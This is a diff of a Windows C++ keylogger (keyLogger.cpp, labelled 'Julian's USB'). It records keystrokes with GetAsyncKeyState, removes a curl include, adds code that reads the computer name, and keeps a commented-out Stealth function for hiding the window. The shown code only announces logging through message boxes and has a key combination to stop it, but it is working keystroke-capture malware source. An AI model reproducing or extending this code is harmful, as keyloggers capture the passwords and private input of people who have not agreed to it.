@@ -1,22 +1,25 @@
 // keyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include <Windows.h>
-#include </curl/include/curl/curl.h>
 #include <iostream>
+#include <lmcons.h>
 #include <fstream>
 #include <sstream>
 #include <cctype>
 #include <iomanip>
 #include <string>
+
 using namespace std;
+
+int const MAX_USERNAME_LENGTH = 104;
 
 //void Stealth();
 string translateKey(int keyStroke);
 void logKey(string keyStroke);
 
 int main()
-{ 
-    enum Status{disable, enable};
+{
+    enum Status { disable, enable };
     Status log = enable;
 
     MessageBox(NULL, "Key Logging Status: ON", "Julian's USB", MB_OK | MB_ICONASTERISK);
@@ -29,7 +32,7 @@ int main()
             bool LControlDown = GetAsyncKeyState(VK_LCONTROL);
 
             if (LShiftDown && LControlDown)
-            { 
+            {
                 log = disable;
             }
             if (GetAsyncKeyState(i) & 0b1)
@@ -41,9 +44,16 @@ int main()
 
     MessageBox(NULL, "Key Logging Status: OFF", "Julian's USB", MB_OK | MB_ICONASTERISK);
 
-    return 0;
-}
+    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD hnBufferSize = sizeof(hostname);
 
+
+    GetComputerName(hostname, &hnBufferSize);
+    cout << hostname << endl;
+
+
+}
+  
 /*void Stealth()
 {
     int hide = 0;//this number determines what the window will do when executes. When 0 window is hidden.
